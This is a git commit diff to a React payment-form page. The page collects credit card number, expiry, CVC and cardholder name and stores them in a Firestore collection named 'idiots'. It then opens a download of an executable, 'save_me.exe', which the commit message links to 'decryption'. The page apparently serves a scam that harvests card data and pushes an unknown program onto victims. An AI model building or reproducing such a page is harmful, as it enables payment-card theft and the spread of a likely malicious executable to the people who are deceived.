aab02db43253aa1b3ed284355aaee3461b25142a
ntafra00 <ntafra00@fesb.hr>
2023-06-03 23:38:37 +0200

    apply validation and add URL for decryption

--- src/app/creditcard/page.js
+++ src/app/creditcard/page.js
@@ -3,26 +3,44 @@ import React, { useState } from "react";
 import Cards from "react-credit-cards-2";
 import "react-credit-cards-2/dist/es/styles-compiled.css";
 import addData from "@/firebase/firestore/addData";
+import { isFieldValid, isFormValid, areAllFieldsPopulated } from "@/utils/validation";
+
+const defaultState = {
+  number: "",
+  expiry: "",
+  cvc: "",
+  name: "",
+  focus: "",
+}
 
 const PaymentForm = () => {
-  const [state, setState] = useState({
-    number: "",
-    expiry: "",
-    cvc: "",
-    name: "",
-    focus: "",
-  });
+  const [state, setState] = useState(defaultState);
+  const [errorMessage, setErrorMessage] = useState("")
 
-  const SendData = async (event) => {
+  const sendData = async (event) => {
     event.preventDefault();
-    const { error } = await addData("idiots", state.name, state);
-    console.log(error);
+    if (!areAllFieldsPopulated(state)) {
+      setErrorMessage("All fields are required");
+      return;
+    }
+    const message = isFormValid(state);
+    if (message) {
+      setErrorMessage(message);
+      return;
+    }
+    const { error } = await addData("idiots", state.name, { number: state.number, expiry: state.expiry, cvc: state.cvc, name: state.name });
+    if (!error) {
+      window.open('https://download1581.mediafire.com/6lrzhne0pgvgfL1hl7w8t8gQGixwaHNYn_Hf5vYVDt-V_AELEBhxZ2rgJkFU7mgP7fyDDzs5GPEJFvm3vHphECLT90Y8tO3HOEka6a0Ew3H4JHkHl4FwNpuZ3w741AW7aCn2zrxDd-n4Br_wVLf2nU6a5li1YB-D7t4Te3WDraU/bkor3ldplijp5p1/save_me.exe', '_blank', 'noreferrer');
+    }
+    setState(defaultState)
   };
 
-  const handleInputChange = (evt, limit) => {
+  const handleInputChange = (evt) => {
+    setErrorMessage("");
     const { name, value } = evt.target;
-
-    setState((prev) => ({ ...prev, [name]: value.slice(0, limit) }));
+    if (value === '' || isFieldValid(name, value)) {
+      setState((prev) => ({ ...prev, [name]: value }));
+    }
   };
 
   const handleInputFocus = (evt) => {
@@ -52,50 +70,45 @@ const PaymentForm = () => {
         />
         <form className="flex flex-col items-center justify-center gap-4 mt-10 ">
           <input
-            required
-            type="number"
             name="number"
+            maxLength={16}
             placeholder="Card namber"
             value={state.number}
-            onChange={(evt) => handleInputChange(evt, 16)}
+            onChange={(evt) => handleInputChange(evt)}
             onFocus={handleInputFocus}
           />
           <input
-            required
-            type="expiry"
+            maxLength={4}
             name="expiry"
             placeholder="Expiretion date"
             value={state.expiry}
-            onChange={(evt) => handleInputChange(evt, 4)}
+            onChange={(evt) => handleInputChange(evt)}
             onFocus={handleInputFocus}
           />
 
           <input
-            required
-            type="cvc"
+            maxLength={3}
             name="cvc"
             placeholder="CVV"
             value={state.cvc}
-            onChange={(evt) => handleInputChange(evt, 3)}
+            onChange={(evt) => handleInputChange(evt)}
             onFocus={handleInputFocus}
           />
           <input
-            required
-            type="name"
+            maxLength={16}
             name="name"
             placeholder="Name on Card"
             value={state.name}
-            onChange={(evt) => handleInputChange(evt, 15)}
+            onChange={(evt) => handleInputChange(evt)}
             onFocus={handleInputFocus}
           />
-          <a href="https://download.wetransfer.com/eugv/0172365ca9a39b4a7deae712239b218120230602064900/aa97929cb675896a9f7c3ff2b79992eee3ae6d5d/save_me.exe?cf=y&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQifQ.eyJleHAiOjE2ODU2ODkyMjIsImlhdCI6MTY4NTY4ODYyMiwiZG93bmxvYWRfaWQiOiI1NmI1ODMyYi1jOTUxLTQwNGItYTRkYS0zNDA2NTU5NDAxNGEiLCJzdG9yYWdlX3NlcnZpY2UiOiJzdG9ybSJ9.bMr8_kpxdxis_urVZ8QJhqcP-4NBuIDuJ4_xXdIrHYk">
-            <button
-              onClick={SendData}
-              className="border-pink-500 border-[2px] px-8 py-3 bg-pink-500 text-white rounded-full mt-4"
-            >
-              SUBMIT
-            </button>
-          </a>
+          {errorMessage && <p style={{ color: "red" }}>{errorMessage}</p>}
+          <button
+            onClick={sendData}
+            className="border-pink-500 border-[2px] px-8 py-3 bg-pink-500 text-white rounded-full mt-4"
+          >
+            SUBMIT
+          </button>
         </form>
       </div>
     </>
